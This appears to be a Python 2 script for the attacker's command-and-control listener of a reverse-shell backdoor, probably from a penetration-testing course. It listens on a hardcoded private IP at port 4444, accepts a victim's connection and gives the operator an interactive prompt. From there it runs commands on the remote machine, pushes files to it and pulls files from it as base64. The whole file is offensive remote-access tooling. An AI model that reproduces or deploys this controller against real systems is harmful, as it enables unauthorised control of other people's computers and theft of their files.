#! /usr/bin/env python

import socket, json, base64


class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port))
		listener.listen(0)
		print("[+] Waiting connection on port 4444")
		self.connection, address = listener.accept()
		print("[+] Got a connection from " + str(address))
		
	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)
	
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Download Successful"
			
	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())
	
	def execute_remotely(self, command):
		if command[0] == 'upload':
			file_content = self.read_file(command[1])
			command.append(file_content)
		self.reliable_send(command)
		if command[0] == 'exit':
			self.connection.close()
			exit()
		output = self.reliable_receive()
		if command[0] == 'download' and "[-] Error" not in output:
			output = self.write_file(command[1], output)
		return output
		
	def run(self):
		while True:
			command = raw_input(">>")
			command = command.split(" ")
			try:
				result = self.execute_remotely(command)
			except Exception:
				result = "[-] Error command Execution."
			print(result)
			
my_listener = Listener("172.16.93.128", 4444)
my_listener.run()
			
